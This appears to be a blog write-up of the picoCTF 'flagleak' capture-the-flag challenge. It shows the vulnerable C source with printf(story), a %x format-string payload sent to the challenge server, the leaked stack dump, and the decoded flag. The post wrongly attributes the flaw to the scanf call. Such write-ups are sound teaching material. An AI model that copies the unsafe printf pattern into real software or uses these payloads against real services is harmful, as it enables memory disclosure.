---
layout: post
title:  "flagleak"
grouped_by: picobin
---
### Description
> Story telling class 1/2
I'm just copying and pasting with this program. What can go wrong? You can view source here. And connect with it using:
nc saturn.picoctf.net 50362

## Analysis

Opening the program vuln.c and reading through it
```c
void readflag(char* buf, size_t len) {
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,len,f); // size bound read
}

void vuln(){
   char flag[BUFSIZE];
   char story[128];

   readflag(flag, FLAGSIZE);

   printf("Tell me a story and then I'll tell you one >> ");
   scanf("%127s", story);
   printf("Here's a story - \n");
   printf(story);
   printf("\n");
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
  return 0;
}


```
We immediatley find ` scanf("%127s", story)`. This should be now vulnerable to format string attack. 

Running the executable just to see how it is printed.

```
$./vuln                                                                                                                                                                                                                                                          
Tell me a story and then I'll tell you one >> adfafasdfas
Here's a story -
adfafasdfas
```


## Solution

Although we know we can send in `%x` as input, we still do-not know how many so that we get the entire story(flag). So I'll do some trial and error. Initially I went with 50.

```
[ctf] nc saturn.picoctf.net 52748     5
Tell me a story and then I'll tell you one >> %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
Here's a story -
ffbe31f0ffbe32108049346782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578250f7f6d4101f7fa10008048338f7f65d20f7deaab06f6369707b4654436b34334c5f676e3167346c466666305f3474535f315f6b63623261317d613235fbad20008eb931000f7fa1990804c000
```

The output seems like hex. We'll convert it to text and see what we get 

[![flagleak](https://i.imgur.com/AJrLrht.png)](https://i.imgur.com/AJrLrht.png)


Just converting to hex will not suffice, we need to swap endianness as well. 
We get the flag `picoCTF{L34k1ng_Fl4g_0ff_St4ck_11a2b52a}`